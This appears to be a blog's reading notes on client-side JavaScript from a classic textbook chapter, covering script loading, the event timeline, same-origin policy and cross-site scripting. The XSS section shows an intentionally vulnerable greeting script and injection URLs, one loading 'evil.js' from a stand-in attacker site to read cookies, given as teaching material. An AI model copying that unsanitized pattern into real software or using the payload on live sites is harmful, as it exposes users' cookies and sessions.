{"title":"Javascript in Web Browsers","date":"2018-09-08T08:25:17.000Z","excerpt":"","slug":"js-web-browser","comments":true,"tags":["note","javascript"],"categories":["language core"],"updated":"2018-09-09T02:48:18.537Z","content":"<blockquote>\n<p>This is the reading note for “Chapter 13: Javascript in Web Browser, Javascript: The definitive guide 5th edition”. <br></p>\n</blockquote>\n<p>Javascript that used within web browsers are commonly called client-side Javascript. Some pages present static information and can be called documents.  <br></p>\n<h2 id=\"Client-Side-Javascript\"><a href=\"#Client-Side-Javascript\" class=\"headerlink\" title=\"Client-Side Javascript\"></a>Client-Side Javascript</h2><p>The Window object is the main entry point to all client-side JS features and APIs. It represents a web browser window or frame, and you can refer to it with the identifier <code>window</code>. In client-side JS, the Window object is also the global object, which means you can access its properties without prefixing the <code>window</code>. <br></p>\n<p>One of the most important properties of the Window object is <code>document</code>: it refers to a Document object that represents the content displayed in the window. Another set of important properties on Window, Document and Element objects are the event handler properties. These allow scripts to specify functions that should be invoked asynchronously when certain events occur. Event handler properties have names that begin with the word ‘on’. <br></p>\n<p>One of the most important event handlers is the <code>onload</code> handler of the Window object. It is triggered when the content of the document displayed in the window is stable and ready to be manipulated. For example: if you use <code>&lt;script&gt;</code> tag in <code>&lt;header&gt;</code>, you might want to wrap your code in <code>window.load()</code>. <br></p>\n<h3 id=\"Embeding\"><a href=\"#Embeding\" class=\"headerlink\" title=\"Embeding\"></a>Embeding</h3><p>Client-side JS code is embedded within HTML documents in four ways: </p>\n<ul>\n<li>Inline, between a pair of <code>&lt;script&gt;</code> and <code>&lt;/script&gt;</code> tags.</li>\n<li>From an external file specified by the <code>src</code> attribute of a <code>&lt;script&gt;</code> tag.</li>\n<li>In an HTML event handler attribute, such as <code>onclick</code> or <code>onmouseover</code></li>\n<li>In a URL that uses the special <code>javascript:</code> protocol.</li>\n</ul>\n<p>JS is best embedded in HTML documents using <code>&lt;script&gt;</code> elements with <code>src</code> attributes. Note, however, that HTML5 validators will complain if any text that is not whitespace or a JS comment appears between <code>&lt;script src=&quot;&quot;&gt;</code> and <code>&lt;/script&gt;</code>. <br></p>\n<p>There are a number of advantages to using the <code>src</code> attributes.</p>\n<ul>\n<li>If a file of JS code is shared by more than one page, it only needs to be downloaded once, by the first page that uses it - subsequent pages can retrieve it from the browser cache.</li>\n<li>Because the <code>src</code> attribute takes an arbitrary URL as its value, a JS program or web page from one web server can employ code exported by other web servers. Much Internet advertising relies on this fact. </li>\n</ul>\n<p>Loading scripts from servers other than the one that served document that uses the script has important security implications. The same-origin security policy described prevents JS in a document from one domain from interacting with content from another domain. However, notice that the origin of the script itself does not matter: only the origin of the document in which the script is embedded. Therefore, the same-origin policy does not apply in this case: JS code can interact with the document in which it is embedded, even when the code has a different origin than the document. When you use the <code>src</code> attribute to include a script in your page, you are giving the author of that script complete control over your web page. <br></p>\n<h3 id=\"Event-Handlers-in-HTML\"><a href=\"#Event-Handlers-in-HTML\" class=\"headerlink\" title=\"Event Handlers in HTML\"></a>Event Handlers in HTML</h3><p>Event handler attributes defined in HTML may include any number of JS statements, separated from each other by semicolons. These statements becomes the body of a function, and that function becomes the value of the corresponding event handler property.<br><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;input </span><br><span class=\"line\">    type=<span class=\"string\">'checkbox'</span> </span><br><span class=\"line\">    name=<span class=\"string\">'options'</span> </span><br><span class=\"line\">    value=<span class=\"string\">'giftwrap'</span> </span><br><span class=\"line\">    onchange=<span class=\"string\">\"order.options.giftwrap = this.checked;\"</span> </span><br><span class=\"line\">&gt;</span><br></pre></td></tr></table></figure></p>\n<p>Another way that JS code can be included on the client side in a URL following the <code>javascript:</code> protocol specifier. This special protocol type specifies that the body of the URL is an arbitrary string of JS code to be run by the JS interpreter. You can use a <code>javascript:</code> URL anywhere you’d use a regular URL: the <code>href</code> attribute of an <code>&lt;a&gt;</code> tag, the <code>action</code> attribute of a <code>&lt;form&gt;</code>.<br><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;a href=<span class=\"string\">\"javascript:new Date().toLocaleTimeString();\"</span>&gt;</span><br><span class=\"line\">what time is it?</span><br><span class=\"line\">&lt;<span class=\"regexp\">/a&gt;</span></span><br><span class=\"line\"><span class=\"regexp\"></span></span><br><span class=\"line\"><span class=\"regexp\">&lt;a href=\"javascript:void window.open('about:blank');\"&gt;Open Window&lt;/</span>a&gt;</span><br></pre></td></tr></table></figure></p>\n<p>If you want to ensure that a <code>javascript:</code> URL does not overwrite the document, you can use the <code>void</code> operator to force an invocation or assignment expression to be <code>undefined</code>.</p>\n<h2 id=\"Execution-of-JS-Programs\"><a href=\"#Execution-of-JS-Programs\" class=\"headerlink\" title=\"Execution of JS Programs\"></a>Execution of JS Programs</h2><p>All of these separate bits of code share a single global Window object. That means that they all see the same Document object, and they share the same set of global functions and variables: if a script defines a new global variable or function, that variable or function will be visible to any JS code that runs after the script does.  <br><br>If a web page includes an embedded frame, the JS code in the embeded document has a different global object than the code in the embedding document, and it can be considered a separate JS program. <br></p>\n<p>Javascript program execution occurs in two phases. In the first phase, the document content is loaded and the code from <code>&lt;script&gt;</code> elements is run. Scripts generally run in the order in which they appear in the document. The JS code within any single script is run from top to bottom, in the order that it appears, subject, of course, to JS’s conditionals, loops and other control statements. <br></p>\n<p>Once the document is loaded and all scripts have run, JS execution enters its second phase. This phase is asynchronus and event-driven. During this event-driven phase, the web browser invokes event handler functions in response to events that occur asynchronously. Event hanlders are most commonly invoked by network activity, elapsed time or errors in JS code. <br></p>\n<p>One of the first events that occurs during the event-driven phase is the load event, which indicates that the document is fully loaded and ready to be manipulated. It is common to see programs whose scripts define functions but take no action other than defining an <code>onload</code> event handler function to be triggered by the load event at the beginning of the event-driven phase of execution. The loading phase of a JS program is relatively short, typically lasting only a second or two. Once the document is loaded, the event-driven phase lasts for as long as the document is displayed by the web browser. <br></p>\n<p>Both core JS and client-side JS have a single-threaded execution model. Scripts and event handlers are executed one at the time without concurrency. </p>\n<h3 id=\"Synchronous-Asynchronous-and-Deferred-Scripts\"><a href=\"#Synchronous-Asynchronous-and-Deferred-Scripts\" class=\"headerlink\" title=\"Synchronous, Asynchronous, and Deferred Scripts\"></a>Synchronous, Asynchronous, and Deferred Scripts</h3><p>When the HTML praser encounters a <code>&lt;script&gt;</code> element, it must, by default, run the script before it can resume parsing and rendering the document. This is not much of a problem for inline scripts, but if the script source code is in an external file specified with a <code>src</code> attribute, this means that the portions of the document that follow the script will not appear in the browser until the script has been downloaded and executed. <br></p>\n<p>This <em>synchronous</em> or <em>blocking</em> script execution is the default only. The <code>&lt;script&gt;</code> tag can have <code>defer</code> and <code>async</code> attributes, which cause scripts to be executed differently. These are boolean attributes - they don’t have a value; they just need to be present on the <code>&lt;script&gt;</code> tag. HTML5 says that these attributes are only meaningful when used conjunction with the <code>src</code> attribute. <br></p>\n<p>Both the <code>defer</code> and <code>async</code> attributes are ways of telling the browser that the linked script does not use <code>document.write()</code> and won’t be generating document content, and that therefore the browser can continue to parse and render the document while downloading the script. The <code>defer</code> attribute causes the browser to defer execution of the script until after the document has been loaded and parsed and is ready to be manipulated. The <code>async</code> attribute causes the browser to run the script as soon as possbible but not to block document parsing while the script is being downloaded. If a <code>&lt;script&gt;</code> tag has both attributes, a browser that supports both will honor the <code>async</code> attribute and ignore the <code>defer</code> attribute. <br></p>\n<p>You can load and execute scripts asynchronously, even in browsers that do not support the <code>async</code> attribute, by dynamically creating a <code>&lt;script&gt;</code> element and inserting it into the document.<br><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">loadasync</span>(<span class=\"params\">url</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> head = <span class=\"built_in\">document</span>.getElementsByTagName(<span class=\"string\">'head'</span>)[<span class=\"number\">0</span>];</span><br><span class=\"line\">    <span class=\"keyword\">var</span> s = <span class=\"built_in\">document</span>.createElement(<span class=\"string\">'script'</span>);</span><br><span class=\"line\">    s.src = url;</span><br><span class=\"line\">    head.appendChild(s);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"Eevnt-driven-Javascript\"><a href=\"#Eevnt-driven-Javascript\" class=\"headerlink\" title=\"Eevnt-driven Javascript\"></a>Eevnt-driven Javascript</h3><p>When we speak of an event, we must specify both the event type and the target. If we want our program to respond to an event, we write a function known as an <code>event hanlder</code>, <code>event listener</code>, or sometimes just a <code>callback</code>. Notice that event handler properties have names that, by convention, begin with <code>on</code> and are followed by the name of the event. Also notice that there are no function invocations in any of the code above: we’re assigning functions themselves to these properties. The browser will perform the invocation when the events occur. <br></p>\n<p>In most browsers, for most kinds of events, event handlers are passed an object as an argument, and the properties of this object provide details about the event. The object passed to a click event, for example, would have a property that specified which mouse button was clicked. The return value of an event handler is sometimes used to indicate whether the function has sufficiently handled the event and to prevent the browser from performing whatever default action it would otherwise take. <br></p>\n<p>Events whose targets are elements in a document often propagate up the document tree in a process known as ‘bubbling’. If the user clicks the mouse on a <code>&lt;button&gt;</code>element, for example, a click event is fired on the button. If that event is not handled (and its propagation stopped) by a function registered on the button, the event bubbles up to whatever element the button is nested within, and any click event handler registered on that container element will be invoked. <br></p>\n<p>Most objects that can be event targets have a method named <code>addEventListener()</code>, which allows the registration of multiple listeners.</p>\n<h4 id=\"Client-Side-Javascript-Timeline\"><a href=\"#Client-Side-Javascript-Timeline\" class=\"headerlink\" title=\"Client-Side Javascript Timeline\"></a>Client-Side Javascript Timeline</h4><p>This section explains the timeline of JS program execution in more detail.</p>\n<ol>\n<li>The web browser creates a Document object and begins parsing the web page, adding Element objects and Text nodes to the document as it parses HTML elements and their textual content. The <code>document.readyState</code> property has the value ‘loading’ at this stage. </li>\n<li>When the HTML parser encounters <code>&lt;script&gt;</code> elements that have neither the <code>async</code> nor <code>defer</code> attributes, it adds those elements to the document and then executes the inline or external script. These scripts are executed synchronously, and the parser pauses while the script downloads and runs. Scripts like these can use <code>document.write()</code> to insert text into the input stream. That text will become part of the document when the parser resumes. Synchronous scripts often simply define functions and register event handlers for later use, but they can traverse and manipulate the document tree as it exists when they run. That is, Synchronous scripts can see their own <code>&lt;script&gt;</code> element and document content that comes before it. </li>\n<li>When the parser encounters a <code>&lt;script&gt;</code> element that has the <code>async</code> attribte set, it begins downloading the script text and continues parsing the document. The script will be executed as soon as possible after it has downloaded, but the parser does not stop and wait for it to download. Asyncronous scripts must not use the <code>document.write()</code> method. They can see their own <code>&lt;script&gt;</code> element and all document elements that come before it, and may or may not have access to additional document content.</li>\n<li>When the document is completely parsed, the <code>document.readyState</code> property changes to ‘interactive’.</li>\n<li>Any scripts that had the <code>defer</code> attribute set are executed, in the order in which they appeared in the document. Async scripts may also be executed at this time. Deferred scripts have access to the complete document and must not use the <code>document.write()</code> method. </li>\n<li>The browser fires a DMContentLoaded event on the Document object. This marks the transition from synchronous script execution phase to the asynchronous event-driven phase of program execution. Note, however, that there may still be <code>async</code> scripts that have not yet execuated at this point.</li>\n<li>The document is completely parsed at this point, but the browser may still be waiting for additional content, such as images, to load. When all such content finishes loading, and when all <code>async</code> scripts have loaded and executed, the <code>document.readyState</code> property changes to ‘complete’ and the web browser fires a load event on the Window object. </li>\n<li>From this point on, event handlers are invoked asynchronously in response to user input events, network events, timer expirations, and so on. </li>\n</ol>\n<h2 id=\"Compatibility-and-Interoperability\"><a href=\"#Compatibility-and-Interoperability\" class=\"headerlink\" title=\"Compatibility and Interoperability\"></a>Compatibility and Interoperability</h2><p>The web browser is the operating system for web apps. Client-side JS compatibility and interoperability issues fall into three general categories: </p>\n<ul>\n<li>Evolution</li>\n<li>Nonimplementation</li>\n<li>Bugs</li>\n</ul>\n<p>Awareness of the incompatibilities between browsers is only the first step, of course. Next you must decide how to address the incompatibilities. One strategy is to restrict yourself to using only those features that are universally supported by all of the browsers that you choose to support.  <br></p>\n<p>One of the easiest ways to deal with incompatibilities is to use libraries of code that work around them for you. One of the functions that makes frameworks like jQuery so indespensible is that they define a new client-side API and implement it compatibly for you across all browsers. <br></p>\n<p>The conditional comments look like:<br><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">&lt;!--[if IE 6]&gt;</span></span><br><span class=\"line\"><span class=\"comment\">This content is actually inside an HTML comment.</span></span><br><span class=\"line\"><span class=\"comment\">It will only be displayed in IE 6.</span></span><br><span class=\"line\"><span class=\"comment\">&lt;![endif]--&gt;</span></span><br><span class=\"line\"><span class=\"comment\">&lt;!--[if lte IE 7]&gt;</span></span><br><span class=\"line\"><span class=\"comment\">This content will only be displayed by IE 5, 6 and 7 and earlier.</span></span><br><span class=\"line\"><span class=\"comment\">lte stands for \"less than or equal\".  You can also use \"lt\", \"gt\" and \"gte\".</span></span><br><span class=\"line\"><span class=\"comment\">&lt;![endif]--&gt;</span></span><br><span class=\"line\"><span class=\"comment\">&lt;!--[if !IE]&gt; &lt;--&gt;</span></span><br><span class=\"line\">This is normal HTML content, but IE will not display it</span><br><span class=\"line\">because of the comment above and the comment below.</span><br><span class=\"line\"><span class=\"comment\">&lt;!--&gt; &lt;![endif]--&gt;</span></span><br></pre></td></tr></table></figure></p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/*@cc_on</span></span><br><span class=\"line\"><span class=\"comment\">  @if (@_jscript)</span></span><br><span class=\"line\"><span class=\"comment\">    // This code is inside a JS comment but is executed in IE.</span></span><br><span class=\"line\"><span class=\"comment\">    alert(\"In IE\");</span></span><br><span class=\"line\"><span class=\"comment\">  @end</span></span><br><span class=\"line\"><span class=\"comment\">  @*/</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"Security\"><a href=\"#Security\" class=\"headerlink\" title=\"Security\"></a>Security</h2><p>Client-side JS does not provide any way to write or delete arbitrary directories on the client computer. Client-side JS does not have any general purpose networking capacilities. <br></p>\n<h3 id=\"Same-Origin-Policy\"><a href=\"#Same-Origin-Policy\" class=\"headerlink\" title=\"Same Origin Policy\"></a>Same Origin Policy</h3><p>The <em>same-origin</em> is  a sweeping security restriction on what web content JS code can interact with. It typically comes into play when a web page includes <code>&lt;iframe&gt;</code> elements or opens other browser windows. In this case, the same-origin policy governs the interactions of JS code in one window or frame with the content of other windows and frames. <br><br>The <em>origin</em> of a document is defined as the protocol, host, and port of the  URL from which the document was loaded. Documents loaded from different web servers have different origins. Documents loaded through different ports of the same host have different origins. And a document loaded with the <code>http:</code> protocol has a different origin than one loaded with the <code>https:</code> protocol, even if they come from the same web server. <br></p>\n<p>It is important to understand that the origin of the script itself is not relevant to the same-origin policy: what matters is the origin of the document in which the script is embedded. Suppose, for example, that a script hosted by host A is included in a web page served by host B. The origin of that script is host B and the script has full access to the content of the document that contains it. If the script opens a new window and loads a second document from host B, the script also has full access to the content of that second document. But if the script opens a third window and loads a document from host C into it, the same-origin policy comes into effect and prevents the script from accessing this document. <br></p>\n<p>You should consider any window or frame that contains a document from another server to be off-limits to your scripts. If your script opened the window, your script can close it, but it cannot ‘look inside’ the window inany way. The same-origin policy also applies to scripted HTTP requests made with the XMLHttpRequest. This object allows client-side JS cod3e to make arbitrary HTTP requests to the web server from which the containing document was loaded, but it does not allow scripts to communicate with other web servers. <br></p>\n<p>The same-origin policy poses problems for large websites that use multiple subdomains. For example, a script in a document from <em>home.example.com</em> might legitimately want to read properties of a document loaded from <em>developer.example.com</em>, or scripts from <em>orders.example.com</em> might need to read properties from documents on <em>catalog.example.com</em>. To support multidomain websites of this sort, you can use the <code>domain</code> property of the Document object. By default, the <code>domain</code> property contains the hostname of the server from which the document was loaded. You can set this property, but only to a string that is a valid domain suffix of itself. Thus if <code>domain</code> is originally the string ‘home.example.com’, you can set it to the string ‘example.com’, but not ‘home.example’ or ‘ample.com’. Furthermore, the <code>domain</code> value must have at least one dot in it; you cannot set it to ‘com’ or any other top-level domain. <br></p>\n<p>If two windows (or frames) contain scripts that set <code>domain</code> to the same value, the same-origin policy is relaxed for these two windows, and each window can interact with the other. For example, cooperating scripts in documents loaded from <em>order.example.com</em> and <em>catalog.example.com</em> might set their <code>document.domain</code> properties to ‘example.com’, thereby making the documents appear to have the same origin and enabling each document to read properties of the other. <br></p>\n<p>The second technique for relaxing the same-origin policy is being standardized under the name Cross-Origin Resource Sharing. This draft standard extends HTTP with a new <strong>Origin:</strong> request header and new <strong>Access-Control-Allow-Origin</strong> response header. It allows servers to use a header to explicitly list origins that may request a file or to use a wildcard and allow a file to be requested by any site. <br></p>\n<p>Another new technique, known as cross-document messaging, allows a script from one document to pass textual messages to a script in another document, regardless of the script origins. Calling the <code>postMessage()</code> method on a Window object results in the asynchronous delivery of a message event to the document in that window. A script in one document still cannot invoke methods or read properties of the other document, but they can conmmunicate safely through this message-passing technique. <br></p>\n<h3 id=\"XSS\"><a href=\"#XSS\" class=\"headerlink\" title=\"XSS\"></a>XSS</h3><p><em>Cross-site scripting</em>, or XSS, is a term for a category of security issues in which an attacker injects HTML tags or scripts into a target website. A web page is vulnerable to cross-site scripting if it dynamically generates document content and bases that content on user-submitted data without first ‘sanitizing’ that data by removing any embedded HTML tags from it.  <br><br><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"undefined\"></span></span><br><span class=\"line\"><span class=\"javascript\"><span class=\"keyword\">var</span> name = <span class=\"built_in\">decodeURIComponent</span>(<span class=\"built_in\">window</span>.location.search.substring(<span class=\"number\">1</span>)) || <span class=\"string\">''</span>;</span></span><br><span class=\"line\"><span class=\"javascript\"><span class=\"built_in\">document</span>.write(<span class=\"string\">'Hello '</span> + name);</span></span><br><span class=\"line\"><span class=\"undefined\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p>\n<p>This two-line script use <code>window.location.search</code> to obtain the portion of its own URL that begins with <code>?</code>. If uses <code>document.write()</code> to add dynamically generated content to the document. This page is intended to be invoked with a URL like this: <code>http://www.example.com/greet.html?David</code>. When used like this, it displays the text “Hello David”. But consider what happens when it is invoked with this URL:  <code>http://www.example.com/greet.html?%3Cscript%3Ealert(&#39;David&#39;)%3C/script%3E</code>.<br>With this URL, the script dynamically generates another script. In this case, the injected script simply displays a dialog box, which is relatively benign. But consider this case:<br><code>http://siteA/greet.html?name=%3Cscript src=siteB/evil/js%3E%3C/script%3E</code>.<br>Cross-site scripting attacks are so called because more than one site is involved. Site B includes a specially crafted link to site A that injects a script from site B. The script <em>evil.js</em> is hosted by the evil site B, but it is now embedded in site A, and it can do absolutely anything it wants with site A’s content. More dangerously, the malicious script can read cookies stored by site A. <br><br>In general, the way to prevent XSS attacks is to remove HTML tags from any untrusted data before using it to creat dynamic document content. </p>\n","prev":{"title":"The Window Object","slug":"js-window-object"},"next":{"title":"Javascript: Class(2)","slug":"js-class-2"},"link":"https://whitefusion.github.io/post/js-web-browser"}